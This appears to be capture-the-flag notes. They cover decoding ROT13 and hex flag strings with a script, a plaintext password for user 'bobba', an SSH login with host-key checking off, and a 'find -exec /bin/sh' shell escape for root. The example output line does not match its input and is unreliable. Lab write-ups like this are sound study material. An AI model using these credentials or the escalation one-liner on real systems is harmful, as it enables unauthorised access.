
### How to Use the hashexec.sh

1. **Make it Executable**:
   Run the following command to make the script executable:
   ```bash
   chmod +x hashexec.sh
   ```

2. **Run the Script**:
   You can run the script by passing the string and hash type. Here are examples:

   - For ROT13:
     ```bash
     ./hashexec.sh "guz{06834nnp0714586s2o2s925ps49opq31}" rot13
     ```

   - For Hexadecimal:
     ```bash
     ./hashexec.sh "74686d7b38393334623432653339656133613135323962333633393039353466306632617d" hex
     ```

### Expected Output
- For ROT13 input:
   ```
   ROT13 converted: flag
   ```


## cred

```bash
Password='-`G)8(t/NDkZ"u^{'
user=bobba
```
## connect

```bash
export ip=<ip>
ssh -o StrictHostKeyChecking=no bobba@"$ip" 
```
## root

It can be used to break out from restricted environments by spawning an interactive system shell.
```bash
find . -exec /bin/sh \; -quit
```
